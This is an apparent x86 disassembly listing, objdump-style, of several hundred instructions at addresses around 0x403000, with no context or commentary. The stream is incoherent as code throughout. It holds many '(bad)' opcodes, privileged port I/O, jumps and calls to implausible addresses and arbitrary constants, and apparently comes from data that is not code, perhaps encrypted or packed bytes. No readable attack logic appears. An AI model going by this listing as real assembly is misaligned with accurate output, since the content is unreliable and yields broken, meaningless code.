  402ff4:	push   esi
  402ff5:	out    0xbf,al
  402ff7:	mov    al,ds:0x5b188dc9
  402ffc:	stos   BYTE PTR es:[edi],al
  402ffd:	bound  di,DWORD PTR [ecx]
  403000:	sub    BYTE PTR [edx+0x38],bl
  403003:	cmp    ecx,DWORD PTR [eax+ecx*4+0x4b]
  403007:	mov    eax,DWORD PTR [ecx]
  403009:	sti    
  40300a:	dec    esi
  40300b:	scas   al,BYTE PTR es:[edi]
  40300c:	inc    esi
  40300d:	test   edi,eax
  40300f:	push   ecx
  403010:	aam    0x73
  403012:	in     al,dx
  403013:	cmp    ebx,esi
  403015:	xchg   edi,eax
  403016:	sub    BYTE PTR [edi-0x60],dl
  403019:	dec    edi
  40301a:	mul    cl
  40301c:	push   ds
  40301d:	fcomi  st,st(3)
  40301f:	cwde   
  403020:	mov    esi,0x97571137
  403025:	repz adc DWORD PTR [eax+0x34],edi
  403029:	loop   0x40306e
  40302b:	leave  
  40302c:	and    al,0xe2
  40302e:	mov    bl,0x7
  403030:	lea    ebx,[eax+0xc]
  403033:	push   ebp
  403034:	aas    
  403035:	mov    ebx,0xa7d357f9
  40303a:	cmp    ah,BYTE PTR [esi-0x4f5feace]
  403040:	mov    bh,0x3
  403042:	mov    dl,0x21
  403044:	or     DWORD PTR [esi],0xffffffbd
  403047:	jnp    0x4030b2
  403049:	out    dx,al
  40304a:	mov    dh,BYTE PTR [ebx-0x55]
  40304d:	push   0xc1c53edf
  403052:	sub    ebx,DWORD PTR [ecx]
  403054:	test   BYTE PTR [eax+0x422071a1],ch
  40305a:	mov    dl,0x5e
  40305c:	xor    eax,0x99569fab
  403061:	(bad)  
  403063:	fdivrp st(5),st
  403065:	push   0x26
  403067:	xchg   edx,eax
  403068:	sahf   
  403069:	inc    eax
  40306a:	ret    
  40306b:	jbe    0x4030e7
  40306d:	jmp    0xfda264a8
  403072:	pop    ebx
  403073:	dec    esp
  403074:	movups xmm6,xmm5
  403077:	dec    ebp
  403078:	xlat   BYTE PTR ds:[ebx]
  403079:	adc    ch,BYTE PTR [eax]
  40307b:	out    0x9f,eax
  40307d:	das    
  40307e:	shr    BYTE PTR [edx+0x54],0x35
  403082:	add    al,0xb8
  403084:	pop    ebp
  403085:	es or  dl,BYTE PTR es:[eax+0xd6d904c]
  40308d:	shl    BYTE PTR [edi+0x48],cl
  403090:	jmp    0x512:0xaec69331
  403097:	addr16 or esp,edx
  40309a:	mov    ebp,0xad0bc9b4
  40309f:	push   0x7c041a56
  4030a4:	fcmovne st,st(5)
  4030a6:	jb     0x40307c
  4030a8:	lahf   
  4030a9:	(bad)  
  4030aa:	xor    DWORD PTR [edx+esi*2+0x34becac1],edx
  4030b1:	push   ds
  4030b2:	stc    
  4030b3:	sbb    eax,0x32b8320f
  4030b8:	test   BYTE PTR [ebx-0x2b],bl
  4030bb:	inc    edi
  4030bc:	push   edx
  4030bd:	pushf  
  4030be:	pop    esp
  4030bf:	out    dx,eax
  4030c0:	je     0x40306c
  4030c2:	pop    ebp
  4030c3:	in     eax,dx
  4030c4:	icebp  
  4030c5:	stos   BYTE PTR es:[edi],al
  4030c6:	jno    0x4030d1
  4030c8:	sbb    al,0x12
  4030ca:	pushf  
  4030cb:	mov    edi,0xb4e1a431
  4030d0:	mov    ah,0x6b
  4030d2:	dec    esi
  4030d3:	push   esi
  4030d4:	dec    ecx
  4030d5:	rol    ah,cl
  4030d7:	mov    bl,0x67
  4030d9:	and    esi,esp
  4030db:	sbb    dh,ch
  4030dd:	in     eax,0xf
  4030df:	stos   DWORD PTR es:[edi],eax
  4030e0:	inc    eax
  4030e1:	add    al,0xf6
  4030e3:	dec    edx
  4030e4:	mov    esp,0xab1c07c7
  4030e9:	add    edx,0xc87ba77
  4030ef:	or     al,0xbd
  4030f1:	jnp    0x4030cf
  4030f3:	pop    ecx
  4030f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030f5:	fist   WORD PTR [eax+0x16]
  4030f8:	imul   ebx,edi,0xffffffa3
  4030fb:	cmp    eax,0xb583a280
  403100:	pop    edx
  403101:	cmp    esp,DWORD PTR [ecx+0x526ed675]
  403107:	call   ebx
  403109:	mov    esp,0x74437f1c
  40310e:	jg     0x403142
  403110:	fimul  WORD PTR [ecx-0x7de3a771]
  403116:	in     al,0xe4
  403118:	fld    TBYTE PTR [ecx+ecx*2]
  40311b:	pop    ss
  40311c:	shr    BYTE PTR [edx],cl
  40311e:	sub    al,0x81
  403120:	jns    0x4030ad
  403122:	mov    eax,ds:0x8863908
  403127:	mov    al,ds:0x8995c6e8
  40312c:	add    DWORD PTR [ecx+0x51],0x68fc7ea7
  403133:	sar    eax,1
  403135:	jmp    0xe369b70d
  40313a:	loope  0x403155
  40313c:	(bad)  [ecx]
  40313e:	push   ds
  40313f:	stc    
  403140:	push   edi
  403141:	inc    BYTE PTR [ecx-0x78]
  403144:	imul   edi,DWORD PTR [ebx],0xc
  403147:	cs ds cwde 
  40314a:	jp     0x403107
  40314c:	loope  0x40313b
  40314e:	(bad)  
  40314f:	fsubp  st(0),st
  403151:	push   0xffffff9e
  403153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403154:	push   ss
  403155:	adc    ebp,DWORD PTR [eax-0x5f]
  403158:	sub    BYTE PTR [eax-0x64d8c7a7],bl
  40315e:	inc    ebp
  40315f:	dec    ecx
  403160:	mov    ebx,fs
  403162:	inc    esp
  403163:	inc    ebx
  403164:	lods   al,BYTE PTR ds:[esi]
  403165:	push   cs
  403166:	dec    ebp
  403167:	inc    edx
  403168:	aaa    
  403169:	or     eax,0x7e9e8849
  40316e:	and    eax,0x518b7490
  403173:	inc    edi
  403174:	mov    WORD PTR [edx-0x6f],es
  403177:	jno    0x40312b
  403179:	xor    ah,ah
  40317b:	push   es
  40317c:	mov    esp,0xa9e8442d
  403181:	ds add al,0xba
  403184:	popf   
  403185:	jmp    0x1386fc56
  40318a:	inc    edx
  40318b:	xchg   ecx,eax
  40318c:	sbb    eax,0x3e20e2e6
  403191:	pop    ebx
  403192:	adc    DWORD PTR ds:0x19a27d29,edi
  403198:	mov    al,ds:0x5c61d1a1
  40319d:	call   0xeaff5159
  4031a2:	lock mov DWORD PTR [ebp+0x7d],0x78a50b7f
  4031aa:	arpl   WORD PTR [ebp+0x3999d9f5],bp
  4031b0:	int3   
  4031b1:	sbb    BYTE PTR ds:0xd8251f85,ah
  4031b7:	adc    ebx,DWORD PTR [esi]
  4031b9:	push   ss
  4031ba:	mov    ecx,0xa75b3225
  4031bf:	dec    ebx
  4031c0:	shr    edi,0xac
  4031c3:	outs   dx,BYTE PTR ds:[esi]
  4031c4:	loop   0x403220
  4031c6:	ret    0x4f05
  4031c9:	pop    edx
  4031ca:	jne    0x4031e8
  4031cc:	mov    dl,0x2a
  4031ce:	popa   
  4031cf:	pop    ss
  4031d0:	aaa    
  4031d1:	push   es
  4031d2:	push   ss
  4031d3:	sti    
  4031d4:	adc    al,0x34
  4031d6:	enter  0x44f5,0x5c
  4031da:	cli    
  4031db:	adc    dl,BYTE PTR [edi-0x7ec01f7a]
  4031e1:	mov    DWORD PTR [edi],0xbbc30e2d
  4031e7:	or     esi,DWORD PTR [ebx+0x38]
  4031ea:	icebp  
  4031eb:	dec    edi
  4031ec:	dec    ebp
  4031ed:	test   BYTE PTR fs:[ebp-0x31],dh
  4031f1:	jmp    0x4c3a7ab7
  4031f6:	xor    DWORD PTR [ecx-0xa],ebx
  4031f9:	lods   al,BYTE PTR ds:[esi]
  4031fa:	ins    DWORD PTR es:[edi],dx
  4031fb:	popf   
  4031fc:	call   0x2374b7d
  403201:	arpl   si,bp
  403203:	imul   ebx,DWORD PTR [esi],0xba35de44
  403209:	les    eax,FWORD PTR [ebp-0x3acc57e0]
  40320f:	pop    ebx
  403210:	mov    WORD PTR [edi-0x4f],?
  403213:	out    0x0,eax
  403215:	jne    0x403286
  403217:	push   edx
  403218:	bound  esp,QWORD PTR [esi-0x37]
  40321b:	cmp    BYTE PTR [eax],dl
  40321d:	sar    BYTE PTR [edi-0x2866bb83],0xdf
  403224:	jl     0x403200
  403226:	mov    dh,0x8b
  403228:	call   0x589e762f
  40322d:	into   
  40322e:	out    dx,eax
  40322f:	imul   edx,DWORD PTR [ecx-0xd8e4cc],0xded25e74
  403239:	mov    fs,WORD PTR [esi]
  40323b:	sub    esi,DWORD PTR [eax-0x64584c8d]
  403241:	sub    DWORD PTR [ebx],ebp
  403243:	int3   
  403244:	xchg   edi,eax
  403245:	add    eax,ebx
  403247:	add    BYTE PTR [ebx+edi*2-0x77],ah
  40324b:	jbe    0x403219
  40324d:	fmul   st(4),st
  40324f:	xchg   esi,eax
  403250:	cmc    
  403251:	mov    ebx,DWORD PTR [eax+0x39c0ebd4]
  403257:	es call ecx
  40325a:	mov    dh,0xfb
  40325c:	sub    al,0xfc
  40325e:	outs   dx,DWORD PTR ds:[esi]
  40325f:	out    dx,eax
  403260:	cwde   
  403261:	loop   0x40321e
  403263:	(bad)  
  403264:	int3   
  403265:	adc    BYTE PTR [esi+esi*1+0x4cb8fa73],ch
  40326c:	jle    0x40322e
  40326e:	mov    al,0x55
  403270:	adc    al,0x5a
  403272:	pop    ecx
  403273:	dec    edx
  403274:	loope  0x4032cf
  403276:	pop    es
  403277:	mov    eax,0x828c888b
  40327c:	bound  edi,QWORD PTR [eax-0x8]
  40327f:	jmp    DWORD PTR [ebx+0x1e]
  403283:	inc    BYTE PTR [edx-0x50]
  403286:	fwait
  403287:	jecxz  0x403301
  403289:	sti    
  40328a:	inc    edi
  40328b:	daa    
  40328c:	pop    ecx
  40328d:	pop    ebp
  40328e:	mov    esp,0x36f49a14
  403293:	enter  0x5f38,0xbf
  403297:	jmp    0x4032fb
  403299:	mov    edx,0x30efc96d
  40329e:	mov    edi,0x8c35023f
  4032a3:	mov    WORD PTR [ebp+0x23b27b5a],cs
  4032a9:	inc    edx
  4032aa:	jge    0x4032a6
  4032ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032ad:	addr16 mov edi,0x16720fb1
  4032b3:	pop    es
  4032b4:	(bad)  
  4032b5:	clc    
  4032b6:	sbb    al,0x42
  4032b8:	enter  0xc0d8,0x8c
  4032bc:	shl    edx,1
  4032be:	xor    eax,0x590b165a
  4032c3:	mov    ds:0xd2b93745,al
  4032c8:	inc    esi
  4032c9:	cwde   
  4032ca:	(bad)  
  4032cb:	jmp    0xe048:0xa0d1d8fb
  4032d2:	pop    esp
  4032d3:	xchg   edx,eax
  4032d4:	repz sub cl,cl
  4032d7:	push   esi
  4032d8:	enter  0x4320,0xe9
  4032dc:	adc    BYTE PTR [eax-0x25],0xd4
  4032e0:	ret    
  4032e1:	mov    ds:0x1f85f74f,al
  4032e6:	es xchg ecx,eax
  4032e8:	mov    esi,0x5016a859
  4032ed:	stos   BYTE PTR es:[edi],al
  4032ee:	ins    BYTE PTR es:[edi],dx
  4032ef:	and    ch,dh
  4032f1:	inc    ebx
  4032f2:	test   al,0xa4
  4032f4:	or     ah,al
  4032f6:	ret    0xc0dd
  4032f9:	bound  edx,QWORD PTR [edi+edi*4+0x5d]
  4032fd:	mov    bh,0x45
  4032ff:	pop    ss
  403300:	xlat   BYTE PTR ds:[ebx]
  403301:	ret    0x96bc
  403304:	iret   
  403305:	xlat   BYTE PTR ds:[ebx]
  403306:	mov    ebx,DWORD PTR [ebp+edi*8+0x4c]
  40330a:	rcr    dh,cl
  40330c:	addr16 iret 
  40330e:	pop    ebx
  40330f:	mov    ebx,0x94974a4f
  403314:	out    0xfa,eax
  403316:	dec    edi
  403317:	mov    ds:0xc1eb69d2,eax
  40331c:	and    ecx,DWORD PTR [edi+0x47]
  40331f:	jge    0x4032fc
  403321:	sub    al,BYTE PTR ds:0x41f2307c
  403327:	iret   
  403328:	retf   0x9ed6
  40332b:	stos   DWORD PTR es:[edi],eax
  40332c:	jo     0x403361
  40332e:	sar    BYTE PTR [ebp-0x5e],1
  403331:	repz addr16 jp 0x40330a
  403335:	arpl   si,bx
  403337:	aaa    
  403338:	cs cmp al,0x4a
  40333b:	and    BYTE PTR [esi],al
  40333d:	ins    DWORD PTR es:[edi],dx
  40333e:	mov    dh,0x2a
  403340:	out    0x5f,eax
  403342:	std    
  403343:	dec    edi
  403344:	out    0xe8,eax
  403346:	fild   DWORD PTR [edx+ecx*8]
  403349:	mov    ebx,0xddcc45d9
  40334e:	mov    eax,0x5e852958
  403353:	scas   al,BYTE PTR es:[edi]
  403354:	in     al,dx
  403355:	fadd   QWORD PTR [ecx+0x6f6bc1b9]
  40335b:	cmp    al,0xec
  40335d:	inc    ecx
  40335e:	retf   
  40335f:	cmp    esp,DWORD PTR [esp+esi*2-0xc]
  403363:	push   edx
  403364:	adc    cl,BYTE PTR [ebx]
  403366:	shl    edx,cl
  403368:	cli    
  403369:	adc    dh,BYTE PTR ds:0x50589199
  40336f:	inc    ebp
  403370:	dec    esp
  403371:	push   0x12
  403373:	not    BYTE PTR [ebx-0x11]
  403376:	pusha  
  403377:	jge    0x40337f
  403379:	adc    dl,dh
  40337b:	mov    WORD PTR [ebp-0x38],ss
  40337e:	pop    esi
  40337f:	(bad)  
  403380:	sbb    BYTE PTR [esp+ecx*2-0x3122398],al
  403387:	jle    0x4033d5
  403389:	fdivr  DWORD PTR [ecx+0x2f]
  40338c:	jecxz  0x4033ec
  40338e:	inc    ebp
  40338f:	mov    bl,0x5f
  403391:	sub    bh,BYTE PTR [ebx+eax*4]
  403394:	retf   
  403395:	pop    esi
  403396:	aas    
  403397:	xor    al,0xc1
  403399:	retf   
  40339a:	gs iret 
  40339c:	jg     0x40332e
  40339e:	adc    al,0x7b
  4033a0:	jae    0x403326
  4033a2:	call   0xcd984203
  4033a7:	shr    cl,cl
  4033a9:	aam    0x4c
  4033ab:	sbb    al,0x60
  4033ad:	out    dx,eax
  4033ae:	pop    edi
  4033af:	dec    ebp
  4033b0:	pop    ds
  4033b1:	cmc    
  4033b2:	stc    
  4033b3:	dec    edi
  4033b4:	retf   0xb0c6
  4033b7:	mov    al,ds:0xeef89046
  4033bc:	jno    0x403429
  4033be:	cwde   
  4033bf:	pushf  
  4033c0:	pop    esi
  4033c1:	adc    eax,0x17c7fab7
  4033c6:	adc    dl,bh
  4033c8:	dec    ebp
  4033c9:	inc    edi
  4033ca:	and    ch,BYTE PTR [esp+ebx*2-0x3a]
  4033ce:	rcr    ebx,cl
  4033d0:	xor    ah,BYTE PTR [ebx]
  4033d2:	adc    DWORD PTR [edi],ebx
  4033d4:	rol    DWORD PTR [eax+ecx*2-0x2b8fcaab],cl
  4033db:	or     BYTE PTR [ebx+eax*2+0x49],ch
  4033df:	je     0x4033c5
  4033e1:	push   esp
  4033e2:	rcr    BYTE PTR [esi+0x595cec3f],cl
  4033e8:	(bad)  
  4033e9:	dec    esi
  4033ea:	push   0x8
  4033ec:	mov    bh,0xbf
  4033ee:	mov    esi,ebp
  4033f0:	aad    0x64
  4033f2:	shr    cl,cl
  4033f4:	pop    ebx
  4033f5:	or     BYTE PTR [ebp+0x67],0xd3
  4033f9:	jecxz  0x403419
  4033fb:	inc    edx
  4033fc:	sbb    dh,0xe3
  4033ff:	lock push ds
  403401:	outs   dx,DWORD PTR ds:[esi]
  403402:	leave  
  403403:	sbb    BYTE PTR [edi+0x2b],bl
  403406:	cwde   
  403407:	push   esi
  403408:	xchg   edx,eax
  403409:	inc    esi
  40340a:	pop    ebx
  40340b:	mov    edi,0xfc220c2b
  403410:	int    0xa9
  403412:	adc    eax,0x11d15c68
  403417:	cs rol BYTE PTR ss:0x5f39549b,0xf6
  403420:	sbb    eax,esi
  403422:	jl     0x403458
  403424:	stos   BYTE PTR es:[edi],al
  403425:	mov    dl,0xa8
  403427:	mov    dh,0x3e
  403429:	mov    ds:0x48484cf6,eax
  40342e:	xor    dh,BYTE PTR [edi+0x38]
  403431:	sar    BYTE PTR [edx+0x13],cl
  403434:	scas   eax,DWORD PTR es:[edi]
  403435:	loope  0x4033e6
  403437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403438:	imul   edi,DWORD PTR ds:0xe3014c3d,0x27be0a10
  403442:	ins    DWORD PTR es:[edi],dx
  403443:	mov    ah,dl
  403445:	jns    0x40348b
  403447:	or     eax,0xa09042b8
  40344c:	sub    DWORD PTR [eax+0x3b],0x55
  403450:	pushf  
  403451:	in     al,dx
  403452:	jbe    0x4034cb
  403454:	xchg   DWORD PTR [edi+0x36],esp
  403457:	inc    esi
  403458:	adc    eax,0x6e789bea
  40345d:	pop    eax
  40345e:	jbe    0x403490
  403460:	adc    edx,DWORD PTR [esi+0x4a]
  403463:	shr    ah,1
  403465:	xchg   edi,eax
  403466:	lahf   
  403467:	pop    ss
  403468:	dec    esi
  403469:	sti    
  40346a:	sbb    ch,bh
  40346c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40346d:	mov    edi,0xfc179f66
  403472:	inc    edi
  403473:	pop    es
  403474:	out    dx,al
  403475:	jo     0x403419
  403477:	cld    
  403478:	add    ah,BYTE PTR [eax+0x10440e34]
  40347e:	jg     0x40340f
  403480:	enter  0x5d74,0xe6
  403484:	dec    edi
  403485:	addr16 call 0x550c8234
  40348b:	scas   eax,DWORD PTR es:[edi]
  40348c:	cmp    eax,DWORD PTR [edi+0x4c]
  40348f:	ret    0x914a
  403492:	inc    ecx
  403493:	(bad)  
  403494:	addr16 inc edi
  403496:	jb     0x403502
  403498:	mov    ds:0xfbeb030c,eax
  40349d:	xchg   edi,eax
  40349e:	and    esp,ebp
  4034a0:	push   eax
  4034a1:	outs   dx,DWORD PTR ds:[esi]
  4034a2:	ins    DWORD PTR es:[edi],dx
  4034a3:	aam    0x52
  4034a5:	lahf   
  4034a6:	jns    0x4034ad
  4034a8:	scas   eax,DWORD PTR es:[edi]
  4034a9:	mov    esp,DWORD PTR [esp+edx*8+0x794ff23f]
  4034b0:	ret    0xe1dc
  4034b3:	xor    BYTE PTR [ebp-0x6e9a1431],bl
  4034b9:	push   cs
  4034ba:	cmp    BYTE PTR [edi+0x2c],dh
  4034bd:	cmp    BYTE PTR [edi+0x6f],bl
  4034c0:	stos   BYTE PTR es:[edi],al
  4034c1:	test   eax,0x619341f4
  4034c6:	mov    bh,0x2b
  4034c8:	xchg   ebp,eax
  4034c9:	or     BYTE PTR ds:0x2954e694,dl
  4034cf:	dec    edi
  4034d0:	xor    al,0x1f
  4034d2:	cmp    DWORD PTR [edx+0x1f],edi
  4034d5:	imul   edx,DWORD PTR [esi-0x7f325b67],0xb0341087
  4034df:	inc    eax
  4034e0:	pop    esi
  4034e1:	(bad)
  4034e5:	dec    ecx
  4034e6:	mov    bl,0xc9
  4034e8:	xchg   BYTE PTR [esi],al
  4034ea:	sub    DWORD PTR [ebx],ebp
  4034ec:	mov    cl,cl
  4034ee:	enter  0xb464,0x8a
  4034f2:	lods   eax,DWORD PTR ds:[esi]
  4034f3:	or     edx,esp
  4034f5:	jo     0x40351f
  4034f7:	dec    ebx
  4034f8:	add    esp,ecx
  4034fa:	mov    edi,DWORD PTR [ebx+0x5db31051]
  403500:	imul   edi,edx,0xffffffaf
  403503:	ret    
  403504:	stos   DWORD PTR es:[edi],eax
  403505:	nop
  403506:	inc    ebp
  403507:	push   esp
  403508:	(bad)  
  403509:	dec    ebp
  40350a:	imul   ebx,edi,0x85c15e93
  403510:	jns    0x403589
  403512:	or     al,0xd6
  403514:	adc    eax,0xe5a85fc3
  403519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40351a:	inc    BYTE PTR [ebx]
  40351c:	inc    esi
  40351d:	retf   
  40351e:	mov    bh,0x50
  403520:	and    ah,dh
  403522:	xchg   ebx,eax
  403523:	pop    es
  403524:	mov    al,ds:0xe2bc60f5
  403529:	mov    ebx,0xf3a993b4
  40352e:	and    esi,0x6
  403531:	push   ss
  403532:	mov    al,ds:0x70ac0453
  403537:	xchg   ecx,eax
  403538:	mov    ebp,0xfc61a5ba
  40353d:	jmp    0x40353e
  40353f:	addr16 push ebp
  403541:	setb   dh
  403544:	fs jne 0x403551
  403547:	fdivr  st(2),st
  403549:	sahf   
  40354a:	inc    ebp
  40354b:	(bad)  
  40354c:	xor    BYTE PTR [edx+ebx*4+0x77],ah
  403550:	add    BYTE PTR [esi+ecx*4-0x29],ah
  403554:	push   cs
  403555:	mov    al,0xb5
  403557:	sbb    al,BYTE PTR [ebp+0x2a]
  40355a:	xchg   edx,eax
  40355b:	jae    0x403501
  40355d:	add    cl,bl
  40355f:	imul   ebx,DWORD PTR ds:0x9ac51f57,0xbedc60e2
  403569:	fnstsw WORD PTR [ebp+0x36]
  40356c:	fisttp QWORD PTR [esi+0x5d2f90f7]
  403572:	shl    BYTE PTR ds:0xa2621a9a,0x8
  403579:	jns    0x4035a6
  40357b:	push   esp
  40357c:	lahf   
  40357d:	jo     0x403589
  40357f:	push   eax
  403580:	sbb    DWORD PTR [edx+0x28],0xffffff8b
  403584:	inc    esp
  403585:	aam    0x50
  403587:	loopne 0x403535
  403589:	sbb    al,0xde
  40358b:	(bad)  
  40358c:	sbb    ebp,DWORD PTR [ebp+0x1a1f1cf1]
  403592:	je     0x403571
  403594:	add    ch,BYTE PTR [esi-0x72ef68a]
  40359a:	out    0x61,al
  40359c:	push   cs
  40359d:	mov    bh,0x66
  40359f:	ja     0x4035a0
  4035a1:	add    eax,0xd1f72d7d
  4035a6:	dec    edx
  4035a7:	jl     0x40358e
  4035a9:	xlat   BYTE PTR ds:[ebx]
  4035aa:	sub    eax,0xabaeeafc
  4035af:	add    al,cl
  4035b1:	xor    ch,BYTE PTR [ebx]
  4035b3:	fs inc ecx
  4035b5:	sahf   
  4035b6:	sub    al,0x95
  4035b8:	rdpmc  
  4035ba:	jecxz  0x403576
  4035bc:	shl    ebx,1
  4035be:	or     al,0xb3
  4035c0:	xor    bh,BYTE PTR [edx+0x6bf90416]
  4035c6:	(bad)  
  4035c7:	in     eax,0x21
  4035c9:	cmp    ebp,DWORD PTR [eax]
  4035cb:	int3   
  4035cc:	cwde   
  4035cd:	mov    BYTE PTR [eax+0x7236adc5],0x4d
  4035d4:	popf   
  4035d5:	mov    esi,0x7d2d5ccb
  4035da:	xor    bl,dl
  4035dc:	mov    ebp,0xf562bb0f
  4035e1:	push   cs
  4035e2:	in     eax,dx
  4035e3:	push   ebp
  4035e4:	and    edx,DWORD PTR [ebp-0x60c1b394]
  4035ea:	js     0x403600
  4035ec:	lock retf 0x403
  4035f0:	in     al,dx
  4035f1:	ins    BYTE PTR es:[edi],dx
  4035f2:	xchg   esi,eax
  4035f3:	fisubr WORD PTR [ebp-0x4c]
  4035f6:	std    
  4035f7:	and    DWORD PTR [ebp-0x5a77ae88],esp
  4035fd:	sub    DWORD PTR [edx+0x22],ebx
  403600:	outs   dx,BYTE PTR ds:[esi]
  403601:	mov    esp,0x65b67937
  403606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403607:	loop   0x403596
  403609:	and    ebx,esp
  40360b:	dec    edi
  40360c:	test   DWORD PTR [edx-0x26],esi
  40360f:	cmp    DWORD PTR [ebx-0x3bc81e56],ecx
  403615:	or     eax,0x47dfc591
  40361a:	retf   0x3c9a
  40361d:	hlt    
  40361e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40361f:	push   edi
  403620:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403621:	jae    0x4035bc
  403623:	mov    dh,0xc3
  403625:	cmp    eax,0x80547297
  40362a:	or     DWORD PTR [ebp+edi*1-0x5c],esp
  40362e:	sub    ah,dh
  403630:	(bad)  
  403631:	inc    DWORD PTR [ebp-0x1e]
  403634:	cmp    BYTE PTR [esp+ebp*4+0x6d51151a],ah
  40363b:	dec    esp
  40363c:	shr    BYTE PTR [esi+0x2c814260],cl
  403642:	daa    
  403643:	lock ret 
  403645:	dec    edx
  403646:	pushf  
  403647:	sbb    al,0x46
  403649:	mov    al,ds:0x779bd8cf
  40364f:	lods   eax,DWORD PTR ds:[esi]
  403650:	jmp    0xc5be:0xe8ffbb1b
  403657:	lock js 0x4035ed
  40365a:	sub    eax,ebx
  40365c:	mov    ebp,0xd65ff81d
  403661:	dec    ebp
  403662:	inc    edx
  403663:	into   
  403664:	les    ecx,FWORD PTR [edi-0x65]
  403667:	loopne 0x4036ca
  403669:	jge    0x403602
  40366b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40366c:	mov    dl,0xc2
  40366e:	neg    BYTE PTR [esi]
  403670:	sub    eax,0x85868410
  403675:	cmp    eax,0x2b93bc92
  40367a:	xor    ebp,DWORD PTR [edi]
  40367c:	fist   WORD PTR [ecx+edi*2-0x16]
  403680:	(bad)  [eax]
  403682:	pop    esp
  403683:	dec    eax
  403684:	pop    edi
  403685:	pushf  
  403686:	adc    al,0x58
  403688:	jb     0x403670
  40368a:	or     DWORD PTR [esi+0x2733b08d],0xfffffffe
  403691:	stos   DWORD PTR es:[edi],eax
  403692:	ins    BYTE PTR es:[edi],dx
  403693:	xchg   edx,ebx
  403695:	mov    eax,0xb02a39b
  40369a:	icebp  
  40369b:	dec    ebp
  40369c:	xchg   ebp,eax
  40369d:	fwait
  40369e:	imul   eax,edi,0x5bf3eea7
  4036a4:	adc    al,0x84
  4036a6:	loop   0x4036eb
  4036a8:	cmp    DWORD PTR ds:0x1a321ea5,ebx
  4036ae:	cmp    eax,DWORD PTR [ecx+0x63]
  4036b1:	sbb    al,0x7
  4036b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036b5:	stc    
  4036b6:	ror    DWORD PTR [ebp-0x78],1
  4036b9:	(bad)  
  4036ba:	in     eax,dx
  4036bb:	cmp    ah,bl
  4036bd:	in     al,dx
  4036be:	into   
  4036bf:	add    eax,0x4c58eed0
  4036c4:	call   0xec0d1ace
  4036c9:	shl    BYTE PTR [ebp+0x59],cl
  4036cc:	jno    0x40372d
  4036ce:	jns    0x403694
  4036d0:	or     BYTE PTR [ebp+0x184e96d5],ch
  4036d6:	pop    ecx
  4036d7:	int    0x5
  4036d9:	into   
  4036da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036db:	dec    ecx
  4036dc:	cs ins BYTE PTR es:[edi],dx
  4036de:	mov    al,0xae
  4036e0:	push   0xa2b5072e
  4036e5:	push   eax
  4036e6:	sub    DWORD PTR [esp+ebp*2+0x555d14d],0x98661b48
  4036f1:	xor    eax,0x5631f3e8
  4036f6:	addr16 mov edx,0x97ff12df
  4036fc:	jno    0x4036eb
  4036fe:	xchg   BYTE PTR [eax+0x50d660ce],ch
  403704:	adc    BYTE PTR [edi],dl
  403706:	inc    eax
  403707:	pop    esp
  403708:	fcomp  QWORD PTR ds:0x876c8982
  40370e:	push   ds
  40370f:	xchg   ebx,eax
  403710:	stos   BYTE PTR es:[edi],al
  403711:	add    BYTE PTR [ecx],ah
  403713:	xor    al,BYTE PTR [eax-0x44bdd25f]
  403719:	mov    BYTE PTR [ebx+edx*2-0x30],cl
  40371d:	adc    bh,BYTE PTR [ebx+edi*2-0x579f7e9b]
  403724:	xor    BYTE PTR [esi+ebp*1],cl
  403727:	push   es
  403728:	xchg   ebp,eax
  403729:	icebp  
  40372a:	and    BYTE PTR [edi-0x53],bh
  40372d:	and    BYTE PTR [esi+0x70],ch
  403730:	dec    edi
  403731:	inc    ebp
  403732:	je     0x403740
  403734:	mov    dh,0x59
  403736:	call   0x67ed022e
  40373b:	in     al,dx
  40373c:	jne    0x40370b
  40373e:	mov    dh,dh
  403740:	xchg   ecx,eax
  403741:	pop    esi
  403742:	push   ebp
  403743:	fnstsw WORD PTR [edx+0x5490f3b7]
  403749:	xchg   esp,eax
  40374a:	aas    
  40374b:	or     BYTE PTR [ebp-0x3e],dh
  40374e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40374f:	cmp    BYTE PTR [eax],ch
  403751:	das    
  403752:	imul   ebx,DWORD PTR [eax-0x8ecd232],0xda7d09e0
  40375c:	push   ebx
  40375d:	cmp    ax,0xf284
  403761:	mov    bl,0xae
  403763:	sub    eax,0x5c3d84cf
  403768:	sahf   
  403769:	test   DWORD PTR [eax-0x3a],edx
  40376c:	fmul   QWORD PTR [eax]
  40376e:	out    0xf3,eax
  403770:	fmul   QWORD PTR [edx]
  403772:	xor    DWORD PTR [eax+0x1c],0x57
  403776:	xor    BYTE PTR [ecx],ah
  403778:	(bad)  
  403779:	jb     0x40373e
  40377b:	jne    0x4037d2
  40377d:	sub    edx,DWORD PTR [esi-0x7b]
  403780:	iret   
  403781:	rol    DWORD PTR [edi],0x1d
  403784:	xor    cl,BYTE PTR [ebx+0x33]
  403787:	mov    al,ds:0x5a68cba5
  40378c:	icebp  
  40378d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40378e:	sbb    ah,BYTE PTR [edx]
  403790:	jno    0x403747
  403792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403793:	and    al,0xf6
  403795:	push   0xd494db9d
  40379a:	push   ebp
  40379b:	mov    ds:0x7d36e00a,eax
  4037a0:	fwait
  4037a1:	ins    BYTE PTR es:[edi],dx
  4037a2:	fsubr  QWORD PTR [edi-0x6877f82b]
  4037a8:	jl     0x4037b1
  4037aa:	inc    esp
  4037ab:	ds adc bh,bl
  4037ae:	rcl    BYTE PTR [edx-0x6d179ddf],0x41
  4037b5:	mov    ecx,0x131910e4
  4037ba:	inc    ebx
  4037bb:	and    al,0x27
  4037bd:	sti    
  4037be:	sbb    eax,0x336ec0e
  4037c3:	mov    ds:0x990b2c50,al
